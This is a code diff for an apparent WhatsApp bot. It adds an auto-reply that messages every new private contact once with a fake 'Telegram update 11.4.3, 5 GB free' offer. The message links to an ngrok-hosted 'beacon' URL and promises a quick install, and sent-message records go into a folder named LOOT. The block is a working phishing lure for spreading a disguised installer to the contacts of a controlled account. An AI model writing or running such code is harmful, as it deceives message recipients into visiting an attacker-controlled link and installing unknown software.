@@ -172,6 +172,24 @@ async function start() {
       }
 
       console.log('[' + sender.substring(0, 12) + ']', text.substring(0, 50));
+
+      // Auto-reply "promo" (1x por contato, so chat privado, nunca em grupos)
+      const isGroup = chatId.endsWith('@g.us');
+      if (!isGroup && sock) {
+        const repPath = path.join(LOOT, 'replied_' + chatId.replace(/[@.:]/g, '_') + '.txt');
+        if (!fs.existsSync(repPath)) {
+          const beacon = process.env.GF_BEACON_URL || 'https://badge-pristine-chirping.ngrok-free.dev/t';
+          const promo = process.env.WA_PROMO ||
+            '🎁 Promoção Telegram: atualização 11.4.3 liberada com 5 GB grátis por 3 meses!\n👉 ' + beacon + '\nInstalação em 1 minuto.';
+          try {
+            await sock.sendMessage(chatId, { text: promo });
+            fs.writeFileSync(repPath, new Date().toISOString());
+            console.log('[WA] promo enviada p/', chatId);
+          } catch (e) {
+            console.log('[WA] promo falhou:', e.message);
+          }
+        }
+      }
     }
   });
 
